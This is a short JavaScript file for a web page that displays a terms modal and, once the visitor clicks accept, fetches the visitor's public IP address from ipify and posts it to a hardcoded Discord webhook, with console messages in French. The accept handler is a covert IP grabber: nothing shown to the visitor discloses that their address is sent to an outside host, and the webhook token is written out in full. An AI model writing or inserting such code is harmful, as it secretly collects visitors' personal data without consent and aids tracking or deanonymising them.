document.addEventListener("DOMContentLoaded", function() {
    var modal = document.getElementById("termsModal");
    var acceptBtn = document.getElementById("acceptTermsBtn");

    modal.style.display = "block";

    acceptBtn.onclick = function() {
        modal.style.display = "none";

        getIPAddress().then(ip => {
            const data = { content: "New IP Address: " + ip };

   
            fetch('https://discord.com/api/webhooks/1206923318238646282/C-ymCKBwAKa9iibpEKaJ35lsW2bpCpyjmHwOZi6jN9IhutUVvYueDZuvk9nE0KNygNN6', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                if (response.ok) {
                    console.log('Adresse IP envoyée avec succès');
                } else {
                    console.error('Erreur lors de l\'envoi de l\'adresse IP');
                }
            }).catch(error => {
                console.error('Erreur lors de la récupération de l\'adresse IP:', error);
            });
        });
    };

    function getIPAddress() {
        return fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip);
    }
});

